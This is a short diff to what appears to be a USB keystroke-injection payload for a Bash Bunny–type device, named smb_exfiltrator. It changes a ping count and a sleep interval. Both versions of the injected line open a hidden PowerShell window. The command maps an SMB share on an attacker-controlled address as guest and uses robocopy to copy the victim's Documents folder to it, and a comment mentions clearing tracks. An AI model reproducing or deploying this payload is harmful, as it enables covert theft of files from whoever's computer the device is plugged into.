@@ -41,7 +41,7 @@ LED R G
 ATTACKMODE HID
 QUACK GUI r
 QUACK DELAY 500
-QUACK STRING "powershell -WindowStyle Hidden \"while (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; New-Item \\\172.16.64.1\e\.d; exit }\""
+QUACK STRING "powershell -WindowStyle Hidden \"while (Test-Connection 172.16.64.1 -count 99 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; New-Item \\\172.16.64.1\e\.d; exit }\""
 QUACK ENTER
 
 # Clear tracks?
@@ -99,7 +99,7 @@ while ! [ -f /root/loot/smb_exfiltrator/temp/.d ]; do
   LED B
   sleep 1
   LED R B 100
-  sleep 9
+  sleep 1
 done
 
 
